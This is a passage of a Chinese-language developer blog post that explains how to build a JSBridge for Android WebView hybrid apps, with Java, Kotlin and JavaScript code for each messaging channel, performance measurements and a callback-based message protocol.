<li>需要根据​<code>web</code>​的需要在<code>​WebView</code>​上覆盖显示一些​<code>Native</code>​控件以提供接近​<code>native</code>​的体验（​<code>input</code>​框、地图等）</li>
<li>提供一些诸如本地储存、定位数据之类的服务供​<code>web</code>​使用（虽然部分走的是<code>​V8</code>​引擎，但仍需要<code>​JSBridge</code>​去进行一些通信）</li>
</ul>
</li>
<li>强<code>Hybrid</code>应用<ul>
<li><code>​Native</code>​控件与​<code>web</code>​频繁交互</li>
<li><code>​Native</code>​页面/组件利用​<code>JSBridge</code>​与后端同步数据，简化后端工作量（不需要维护两套通信接口），但过度依赖于<code>​WebView​</code><br><img src="/images/jsbridge_0.png" alt=""></li>
</ul>
</li>
</ul>
<p>以上通信的基础设施就是​<code>JSBridge</code>​，<code>​JSBridge</code>​的实现本身并不复杂，可以看作是对系统接口的二次封装。</p>
<a id="more"></a>
<h2 id="从系统接口说起-Android"><a href="#从系统接口说起-Android" class="headerlink" title="从系统接口说起 *Android"></a>从系统接口说起 *Android</h2><h3 id="Native调用js"><a href="#Native调用js" class="headerlink" title="Native调用js"></a>Native调用js</h3><p>相对来说比较简单，<code>​webview</code>​为我们提供了如下两个接口来执行​<code>js</code>​代码：</p>
<ul>
<li><p><code>api19</code>之前：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Loads the given URL.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Also see compatibility note on &#123;<span class="doctag">@link</span> #evaluateJavascript&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> url the URL of the resource to load</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadUrl</span><span class="params">(String url)</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>api19</code>之后（效率更高）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Asynchronously evaluates JavaScript in the context of the currently displayed page.</span></span><br><span class="line"><span class="comment"> * If non-null, |resultCallback| will be invoked with any result returned from that</span></span><br><span class="line"><span class="comment"> * execution. This method must be called on the UI thread and the callback will</span></span><br><span class="line"><span class="comment"> * be made on the UI thread.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Compatibility note. Applications targeting &#123;<span class="doctag">@link</span> android.os.Build.VERSION_CODES#N&#125; or</span></span><br><span class="line"><span class="comment"> * later, JavaScript state from an empty WebView is no longer persisted across navigations like</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> #loadUrl(String)&#125;. For example, global variables and functions defined before calling</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> #loadUrl(String)&#125; will not exist in the loaded page. Applications should use</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> #addJavascriptInterface&#125; instead to persist JavaScript objects across navigations.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> script the JavaScript to execute.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> resultCallback A callback to be invoked when the script execution</span></span><br><span class="line"><span class="comment"> *                       completes with the result of the execution (if any).</span></span><br><span class="line"><span class="comment"> *                       May be null if no notification of the result is required.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evaluateJavascript</span><span class="params">(String script, ValueCallback&lt;String&gt; resultCallback)</span></span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>我们只需要构建​<code>javascript:</code>​开头形式的代码字符串传入执行就可以了，以上两个方法都是直接返回的。</p>
<h3 id="js调用Native"><a href="#js调用Native" class="headerlink" title="js调用Native"></a>js调用Native</h3><p>实现方式比较多样，先上一张图：<br><img src="/images/jsbridge_1.png" alt=""></p>
<h4 id="shouldOverrideUrlLoading拦截特定schema"><a href="#shouldOverrideUrlLoading拦截特定schema" class="headerlink" title="shouldOverrideUrlLoading拦截特定schema"></a>shouldOverrideUrlLoading拦截特定schema</h4><p><code>​WebView</code>​提供了<code>​shouldOverrideUrlLoading</code>​方法允许我们拦截<code>​web</code>​页面加载的<code>​url</code>​，我们可以利用这个方法采用加载伪协议的方式进行通信：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomWebViewClient</span> <span class="keyword">extends</span> <span class="title">WebViewClient</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> </span>&#123;</span><br><span class="line">      ......</span><br><span class="line">       <span class="comment">// 截取url并操作</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">super</span>.shouldOverrideUrlLoading(view, url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>伪协议形式根据业务不同复杂度也不同，后面的工作主要就是围绕这个<code>scheme</code>字符串解析/生成。</p>
<p>在​<code>web</code>​端，采用加载不可见<code>​iframe</code>​的方式传递<code>​url</code>​到<code>​Native</code>​：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">openURL</span> (<span class="params">url</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">       iframe.style.cssText = <span class="string">'display:none;width:0px;height:0px;'</span>;</span><br><span class="line">       <span class="keyword">var</span> container = <span class="built_in">document</span>.body || <span class="built_in">document</span>.documentElement;</span><br><span class="line">       container.appendChild(iframe);</span><br><span class="line">       iframe.onload = fail;</span><br><span class="line">       iframe.src = url;</span><br><span class="line">       setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">           iframe.parentNode.removeChild(iframe);</span><br><span class="line">       &#125;, <span class="number">0</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
<p>但是此方法在测试中存在一个比较严重的问题：无法在短时间内回调多次​<code>shouldOverrideUrlLoading</code>​方法，也就是说频繁交互的情况下，会有较大概率多次​<code>url</code>​跳转只回调一次该方法，在​<code>github</code>​上非常著名的一个<code>​JSBridge</code>​实现中，将消息排队压缩为一个消息，然后使用一个<code>​url</code>​去通知<code>​Native</code>​调用<code>​js</code>​的取消息​<code>Handler</code>​，<code>​js</code>​再将整合后的消息一起发送给<code>​Native</code>​。</p>
<p>不幸的是，这种方式仍有丢消息的情况，有一笔<code>pr</code>修复了该问题，采用了两个​<code>iframe</code>​一个用于通知、一个用于数据传送。但该方式的效率会显著低于以下几种。</p>
<h4 id="onJsPrompt传递数据"><a href="#onJsPrompt传递数据" class="headerlink" title="onJsPrompt传递数据"></a>onJsPrompt传递数据</h4><p>在<code>​js</code>​调用<code>​window</code>​的<code>​window.alert</code>​，<code>​window.confirm</code>​，<code>​window.prompt</code>​三种方法时，​<code>WebView</code>​中注入的​<code>WebChromeClient</code>​对象的对应方法会被调用，并且可以带有​<code>js</code>​传递过来的参数，我们可以选择其中之一作为我们数据传递的通道，由于​<code>promopt</code>​使用频率较低，所以一般采用它作为调用方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSBridgeWebChromeClient</span> <span class="keyword">extends</span> <span class="title">WebChromeClient</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onJsPrompt</span><span class="params">(WebView view, String url, Stringt message, String defaultValue, JsPromptResult result)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//对message进行处理</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>​js</code>​中只要调用<code>​window.prompt​</code>就可以了：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.prompt(uri, <span class="string">""</span>);</span><br></pre></td></tr></table></figure>
<p>数据传递的格式并没有要求，我们可以采用上述的<code>​schema</code>​或者自己另外制定协议。如果出于与​<code>js​</code>保持一致的考虑，就使用​<code>schema​</code>。</p>
<h4 id="console-log传递数据"><a href="#console-log传递数据" class="headerlink" title="console.log传递数据"></a>console.log传递数据</h4><p>与上种方法大同小异，只不过利用的是​<code>js</code>​调用<code>​console.log</code>​时<code>WebChromeClient</code>的<code>onConsoleMessage</code>回调来处理消息，​<code>js</code>​端只要使用<code>​console.log</code>​就可以了。</p>
<h4 id="addJavascriptInterface注入对象"><a href="#addJavascriptInterface注入对象" class="headerlink" title="addJavascriptInterface注入对象"></a>addJavascriptInterface注入对象</h4><p>​<code>addJavascriptInterface</code>​是<code>​WebView​</code>的一个方法，顾名思义，这个方法是安卓为我们提供的官方实现​<code>JSBridge</code>​的方式，通过它我们可以向​<code>WebView​</code>加载的页面中注入一个​<code>js</code>​对象，​<code>js</code>​可以通过这个对象调用到相应的​<code>Native</code>​方法：<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// class for injecting to js</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bridge</span> </span>&#123;</span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">send</span><span class="params">(msg: <span class="type">String</span>)</span></span> &#123;</span><br><span class="line">        doSomething()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// inject Bridge as _sBridge</span></span><br><span class="line">webview.addJavascriptinterface(Bridge(), <span class="string">"_sBridge"</span>)</span><br></pre></td></tr></table></figure></p>
<p>我们创建了一个​<code>Bridge()</code>​对象并作为​<code>_sBridge</code>​注入到了<code>​webview</code>​的当前页面中，在​<code>js</code>​端即可以通过以下形式调用：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>._sBridge.send(msg);</span><br></pre></td></tr></table></figure><br>该方法是阻塞的，会等待​<code>Native</code>​方法的返回，​<code>Native</code>​会在一个后台线程中执行该方法调用。<br>关于安全性问题：<br>在安卓4.2之前通过注入的对象进行反射调用可以执行其他类的一些方法，存在严重安全漏洞，具体见：<a href="https://blog.csdn.net/weekendboyxw/article/details/48175027" target="_blank" rel="noopener">https://blog.csdn.net/weekendboyxw/article/details/48175027</a><br>4.2之后加入了上述的​<code>@JavascriptInterface</code>​注解来避免暴露额外的方法，从而解决了这一问题。</p>
<h4 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h4><blockquote>
<p>测试方法：<br>​&gt; <code>js</code>​端收到<code>​Bridge</code>​注入完成的事件后，连续触发100次传递消息到<code>​Native</code>​的方法调用，传递2w个英文字符作为消息体，在<code>​Native</code>​端作处理时分别采用立即返回和延迟10ms返回模拟方法处理耗时。统计<code>​js</code>​调用开始到结束的平均时间。</p>
</blockquote>
<table>
<thead>
<tr>
<th>方法</th>
<th>方式立即返回耗时</th>
<th>延迟10ms返回耗时</th>
</tr>
</thead>
<tbody>
<tr>
<td>addJavascriptInterface</td>
<td>1.2ms</td>
<td>13.37ms</td>
</tr>
<tr>
<td>shouldOverrideUrlLoading</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>onJsPrompt</td>
<td>1.78ms</td>
<td>15.87ms </td>
</tr>
<tr>
<td>console.log</td>
<td>0.16ms</td>
<td>0.16ms（完全不阻塞）</td>
</tr>
</tbody>
</table>
<p><code>​shouldOverrideUrlLoading</code>​方式由于采用队列压缩消息，耗时数据与实际业务中数据收发频率相关，暂不测试，可以认为耗时显著高于其他几种。</p>
<h4 id="如何选择"><a href="#如何选择" class="headerlink" title="如何选择"></a>如何选择</h4><p><img src="/images/jsbridge_1.png" alt=""><br>从编码角度上看，​<code>addJavascriptInterface()</code>​方法实现是最为简洁明了的，同时上表中的速度一栏，在实际测试中发现​<code>addJavascriptInterface()</code>​方法耗时比<code>​onJsPrompt</code>​要少。</p>
<p><code>​console.log()</code>​在​10ms​延迟测试中由于自身不阻塞的特性，耗时较短，但在实际处理中，会在​<code>addJavascriptInterface()</code>​中另开线程去异步处理消息，延迟时间也非常短。</p>
<p>综上，使用​<code>addJavascriptInterface</code>​作为<code>​js</code>​向<code>​Native</code>​传递数据的通道是较为合理的选择。如果实在对耗时要求高，可以考虑采用​<code>console.log()</code>​的方式。</p>
<h2 id="JSBridge上层实现"><a href="#JSBridge上层实现" class="headerlink" title="JSBridge上层实现"></a>JSBridge上层实现</h2><p>有了上述的双端通信的基础通道，我们就可以基于此去构建一套易用的方法封装。</p>
<h3 id="消息格式"><a href="#消息格式" class="headerlink" title="消息格式"></a>消息格式</h3><p>为了一定程度上兼容​<code>iOS</code>​端的<code>​JSBridge</code>​，我们双端都采用注册​<code>Handler</code>​，以<code>​Handler</code>​名作为方法索引，再使用​<code>json</code>​作为参数数据的序列化/反序列化格式。<br>下一步解决的问题是如何回调调用方的<code>​callback</code>​，我们期望异步调用在完成时被调用方通过回调​<code>callback</code>​方法来返回数据。这里采用注册​<code>Handler</code>​的思路，在调用方进行调用时，为​<code>callback</code>​方法生成一个​<code>callbackId</code>​作为<code>​Key</code>​来保存这个​<code>callback</code>​方法，被调用方完成处理之后，在返回的消息中一并返回<code>​callbackId</code>​（这时它变为了​<code>responseId</code>​），调用方拿到<code>​callbackId</code>​找到对应方法进行回调。</p>
<p>依此，我们制定的消息格式如下：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"handlerName"</span>: <span class="string">"NameOfHandler"</span>,</span><br><span class="line">    <span class="attr">"data"</span>: <span class="string">"json data"</span>, <span class="comment">// 传送给接收方的数据</span></span><br><span class="line">    <span class="attr">"callbackId"</span>: <span class="string">""</span>, <span class="comment">// 接收方回调调用方的方法id</span></span><br><span class="line">    <span class="attr">"responseId"</span>: <span class="string">""</span>, <span class="comment">// 调用方被回调时收到的方法id，即为发送时的callbackId参数</span></span><br><span class="line">    <span class="attr">"responseData"</span>: <span class="string">"json data"</span> <span class="comment">// 接收方返回的数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>通信过程可以由下图表示：</p>
<p><img src="/images/jsbridge_2.png" alt=""></p>
<p>为了兼容​<code>schema</code>​格式，在消息体的基础上添加<code>​schema</code>​头部，组成最终的消息协议：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CUSTOM_PROTOCOL_SCHEME + &#39;:&#x2F;&#x2F;data&#x2F;message&#x2F;&#39; + messageQueueString</span><br></pre></td></tr></table></figure><br>​<code>messageQueueString</code>​为​<code>json</code>​数组，一个​<code>json</code>​元素为一条消息。</p>
<h3 id="双端通信封装"><a href="#双端通信封装" class="headerlink" title="双端通信封装"></a>双端通信封装</h3><p>当<code>​Native</code>​的<code>​WebView</code>​加载页面到80%以上时，会不断尝试将本地的一个<code>bridge.js</code>文件注入到​<code>WebView</code>​中，不断尝试是为了解决在弱网状况下一次注入可能失败的问题，<code>js</code>代码保证初始化不会重复进行，后续这个文件的代码可以放在前端加载。<code>bridge.js</code>负责初始化<code>​LkWebViewJavascriptBridge</code>​类，封装了一些通信的方法和数据对象。</p>
<h4 id="bridge初始化"><a href="#bridge初始化" class="headerlink" title="bridge初始化"></a>bridge初始化</h4><p><code>bridge.js</code>：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="keyword">var</span> LkWebViewJavascriptBridge = <span class="built_in">window</span>.LkWebViewJavascriptBridge = &#123;</span><br><span class="line">        init: init,</span><br><span class="line">        send: send,</span><br><span class="line">        registerHandler: registerHandler,</span><br><span class="line">        callHandler: callHandler,</span><br><span class="line">        callSync: callSync,</span><br><span class="line">        _handleMessageFromNative: _handleMessageFromNative,</span><br><span class="line">        debug: <span class="literal">true</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    _log(<span class="string">"local js injected"</span>);</span><br><span class="line">    <span class="comment">// notify java</span></span><br><span class="line">    callHandler(<span class="string">"s.bridge.ready"</span>, <span class="built_in">JSON</span>.stringify(<span class="string">"ready msg from js"</span>));</span><br><span class="line">    <span class="keyword">var</span> doc = <span class="built_in">document</span>;</span><br><span class="line">    <span class="keyword">var</span> readyEvent = doc.createEvent(<span class="string">'Events'</span>);</span><br><span class="line">    readyEvent.initEvent(<span class="string">'LkWebViewJavascriptBridgeReady'</span>);</span><br><span class="line">    readyEvent.bridge = LkWebViewJavascriptBridge;</span><br><span class="line">    doc.dispatchEvent(readyEvent);</span><br></pre></td></tr></table></figure><br>1-9行创建了<code>​window.LkWebViewJavascriptBridge</code>​对象，用于访问文件中定义的几个方法（见下文），14行调用<code>s.bridge.ready</code>​这个<code>​Native</code>​预设的<code>​Handler</code>​，通知<code>​js</code>​端的<code>​Bridge</code>​已完成初始化。随后15-19行触发一个自定义事件，用于通知​<code>web</code>​其他组件<code>​JSBridge</code>​已初始化完成，可以开始通信了。</p>
<h4 id="JS调用Native-Handler流程"><a href="#JS调用Native-Handler流程" class="headerlink" title="JS调用Native Handler流程"></a>JS调用Native Handler流程</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">LkWebViewJavascriptBridge.callHandler(<span class="string">"java_handler"</span>, <span class="string">"\"js data\""</span>, <span class="function"><span class="keyword">function</span> (<span class="params">resJson</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"data callback from java: "</span>)  </span><br><span class="line">            <span class="built_in">console</span>.log(resJson)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// js call java handler</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callHandler</span>(<span class="params">handlerName, data, responseCallback</span>) </span>&#123;</span><br><span class="line">    _doSend(&#123;</span><br><span class="line">        handlerName: handlerName,</span><br><span class="line">        data: data</span><br><span class="line">    &#125;, responseCallback);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sendMessage add message, 触发native处理 sendMessage</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_doSend</span>(<span class="params">message, responseCallback</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//        debugger;</span></span><br><span class="line">    _log(<span class="string">"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; _doSend: "</span> + message.handlerName + <span class="string">" "</span> + time());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (responseCallback) &#123;</span><br><span class="line">        <span class="keyword">var</span> callbackId = <span class="string">'cb_'</span> + uniqueId++ + <span class="string">'_'</span> + <span class="keyword">new</span> <span class="built_in">Date</span>().getTime();</span><br><span class="line">        responseCallbacks[callbackId] = responseCallback;</span><br><span class="line">        message.callbackId = callbackId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sendMessageQueue.push(message);</span><br><span class="line">    <span class="keyword">var</span> array = [];</span><br><span class="line">    array.push(message);</span><br><span class="line">    <span class="keyword">var</span> messageQueueString = <span class="built_in">JSON</span>.stringify(array);</span><br><span class="line">    <span class="built_in">window</span>._sBridge.send(CUSTOM_PROTOCOL_SCHEME + <span class="string">'://data/message/'</span> + messageQueueString);</span><br><span class="line"></span><br><span class="line">    _log(<span class="string">"_doSend end &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;:  "</span> + message.handlerName + <span class="string">" "</span> + time());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码逻辑结合上面的消息格式看并不复杂。</p>
<p>注意到20、21行为<code>​callback</code>​生成了<code>​callbackId</code>​并存入了​<code>responseCallbacks​ ​map</code>​中，以便后面回调的处理。</p>
<p><code>​window._sBridge.send</code>​即为<code>​Native</code>​通过<code>​addJavascriptInterface</code>​注入的方法，目前只注入了这一个方法用于数据传输。</p>
<p>这条数据是这样的：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s:&#x2F;&#x2F;data&#x2F;message&#x2F;[&#123;&quot;handlerName&quot;:&quot;java_handler&quot;,&quot;data&quot;:&quot;\&quot;js data\&quot;&quot;,&quot;callbackId&quot;:&quot;cb_1_1534851889294&quot;&#125;]</span><br></pre></td></tr></table></figure><br>​<code>Native</code>​收到<code>​send</code>​调用后，进行如下的事件分发处理：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * handle message from js by call _sBridge.send(msg)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressLint(<span class="meta-string">"CheckResult"</span>)</span></span><br><span class="line"><span class="meta">@JavascriptInterface</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">send</span><span class="params">(msg: <span class="type">String</span>)</span></span> &#123;</span><br><span class="line">    Logger.v(TAG, <span class="string">"\n&lt;-----raw msg from js----&gt;\n<span class="variable">$msg</span>"</span>)</span><br><span class="line">    Flowable.just(msg).subscribeOn(sSchedulers.io())</span><br><span class="line">            .filter &#123;</span><br><span class="line">                <span class="comment">// filter blank or wrong data</span></span><br><span class="line">                <span class="keyword">if</span> (it.isBlank() || !it.startsWith(BridgeUtil.LARK_RETURN_DATA)) &#123;</span><br><span class="line">                    Logger.e(TAG, <span class="string">"&lt;-----illegal msg from js----&gt;"</span>)</span><br><span class="line">                    <span class="keyword">return</span><span class="symbol">@filter</span> <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span><span class="symbol">@filter</span> <span class="literal">true</span></span><br><span class="line">            &#125;.concatMap &#123;</span><br><span class="line">                <span class="comment">// separate data from msg</span></span><br><span class="line">                <span class="keyword">val</span> <span class="keyword">data</span> = BridgeUtil.getDataFromReturnUrl(it)</span><br><span class="line">                        ?: <span class="keyword">throw</span> IllegalStateException(<span class="string">"can't parse message from js"</span>)</span><br><span class="line">                <span class="comment">// deserialize Message</span></span><br><span class="line">                <span class="keyword">val</span> list: List&lt;Message&gt; = Message.toArrayList(<span class="keyword">data</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span><span class="symbol">@concatMap</span> <span class="keyword">if</span> (list.isEmpty()) &#123;</span><br><span class="line">                    Flowable.just(Message())</span><br><span class="line">                &#125; <span class="keyword">else</span> Flowable.fromIterable(list)</span><br><span class="line">            &#125;.flatMap &#123;</span><br><span class="line">                <span class="keyword">if</span> (it.responseId.isNullOrBlank()) &#123;</span><br><span class="line">                    <span class="comment">// call java handler</span></span><br><span class="line">                    <span class="keyword">val</span> callbackFunction = generateJavaCallbackFunction(it.callbackId)</span><br><span class="line">                    <span class="keyword">val</span> handler = getBridgeHandler(it.handlerName)</span><br><span class="line">                    <span class="keyword">val</span> action = Action &#123;</span><br><span class="line">                        handler?.handle(it.<span class="keyword">data</span>, callbackFunction)</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">when</span> (handler?.getType()) &#123;</span><br><span class="line">                        UI -&gt; &#123;</span><br><span class="line">                            <span class="comment">// run on mainThread</span></span><br><span class="line">                            <span class="keyword">return</span><span class="symbol">@flatMap</span> Flowable.just(action)</span><br><span class="line">                                    .subscribeOn(sSchedulers.mainThread())</span><br><span class="line">                        &#125;</span><br><span class="line">                        BACKGROUND -&gt; &#123;</span><br><span class="line">                            <span class="comment">// run on background</span></span><br><span class="line">                            <span class="keyword">return</span><span class="symbol">@flatMap</span> Flowable.just(action)</span><br><span class="line">                                    .subscribeOn(sSchedulers.io())</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> -&gt; &#123;</span><br><span class="line">                            <span class="keyword">return</span><span class="symbol">@flatMap</span> Flowable.empty&lt;Action&gt;()</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// response from js</span></span><br><span class="line">                    <span class="keyword">val</span> javaCallback = javaCallbacks[it.responseId]</span><br><span class="line">                    <span class="keyword">if</span> (javaCallback == <span class="literal">null</span>) &#123;</span><br><span class="line">                        Logger.i(TAG, <span class="string">"callback not found for responseId: <span class="subst">$&#123;it.responseId&#125;</span>"</span>)</span><br><span class="line">                        <span class="keyword">return</span><span class="symbol">@flatMap</span> Flowable.empty&lt;Action&gt;()</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span><span class="symbol">@flatMap</span> Flowable.just(Action &#123;</span><br><span class="line">                            javaCallback.onCallback(it.responseData)</span><br><span class="line">                        &#125;).subscribeOn(sSchedulers.io())</span><br><span class="line">                        <span class="comment">// response callback would run on background by default</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;.subscribe(&#123; it.run() &#125;, &#123;</span><br><span class="line">                Logger.e(TAG, <span class="string">"handle msg from js error: "</span>, it)</span><br><span class="line">            &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码逻辑如下：</p>
<ol>
<li>检查消息的合法性（协议等）</li>
<li>提取消息体并将消息体反序列化为一个​<code>Message</code>​对象的列表</li>
<li>判断​<code>responseId</code>​是否为空，如果为空，说明为​<code>JS</code>​对<code>​Handler</code>​的调用，否则为对一条​<code>Native</code>​消息的回调，我们这里是对<code>s.bridge.ready</code>的调用</li>
<li>生成<code>​callback</code>​函数供<code>​handler</code>​调用：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">generateJavaCallbackFunction</span><span class="params">(callbackId: <span class="type">String</span>?)</span></span>: ICallbackFunction &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">if</span> (callbackId.isNullOrBlank()) &#123;</span><br><span class="line">        <span class="keyword">object</span> : ICallbackFunction &#123;</span><br><span class="line">            <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCallback</span><span class="params">(<span class="keyword">data</span>: <span class="type">String</span>?)</span></span> &#123;</span><br><span class="line">                <span class="comment">// do nothing</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">object</span> : ICallbackFunction &#123;</span><br><span class="line">            <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCallback</span><span class="params">(<span class="keyword">data</span>: <span class="type">String</span>?)</span></span> &#123;</span><br><span class="line">                <span class="comment">// send data back to js</span></span><br><span class="line">                <span class="keyword">val</span> msg = Message(responseData = <span class="keyword">data</span>, responseId = callbackId)</span><br><span class="line">                sendToJs(msg)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>可以看到，如果消息中有​<code>callbackId</code>​的话，就会将​<code>handler</code>​传入的消息作为​<code>responseData​</code>，​<code>callbackId</code>​作为​<code>responseId</code>​构建消息发送到​<code>js</code>​以完成回调。</li>
</ul>
<ol start="5">
<li>获取<code>​handler</code>​，这个过程会把注册在一个​<code>map</code>​中的<code>​handler</code>​根据​<code>handlerName</code>​作为<code>​key</code>​取出</li>
<li>对​<code>handler​</code>类型做判断，目前有两种，一种会运行在主线程，一种会运行在后台线程池</li>
<li>在对应的线程中调用​<code>handler.handle()​</code>传入​<code>data</code>​和生成的<code>​callbackFunction</code>​作为参数，这样就完成了找到对应<code>​handler</code>​并执行其逻辑的过程，​<code>handler</code>​执行的时候像这样：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">handle</span><span class="params">(<span class="keyword">data</span>: <span class="type">String</span>?, callback: <span class="type">ICallbackFunction</span>)</span></span> &#123;</span><br><span class="line">    Toast.makeText(context, <span class="keyword">data</span>, Toast.LENGTH_LONG).show()</span><br><span class="line">    callback.onCallback(<span class="string">"&#123; \"data\":\"callback data from java\"&#125;"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>直接调用<code>​callback</code>​的<code>​onCallback</code>​回传数据就可以了。</li>
<li><code>​onCallback</code>​通过<code>​sendToJs()</code>​方法传递数据到​<code>js</code>​：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">sendToJs</span><span class="params">(msg: <span class="type">Message</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> messageJson = msg.toJson()</span><br><span class="line">    <span class="comment">// escape special characters for json string</span></span><br><span class="line">    messageJson = messageJson?.replace(<span class="string">"(\\\\)([^utrn])"</span>.toRegex(), <span class="string">"\\\\\\\\$1$2"</span>)</span><br><span class="line">    messageJson = messageJson?.replace(<span class="string">"(?&lt;=[^\\\\])(\")"</span>.toRegex(), <span class="string">"\\\\\""</span>)</span><br><span class="line">    <span class="keyword">val</span> javascriptCommand = String.format(BridgeUtil.JS_HANDLE_MESSAGE_FROM_JAVA, messageJson)</span><br><span class="line">    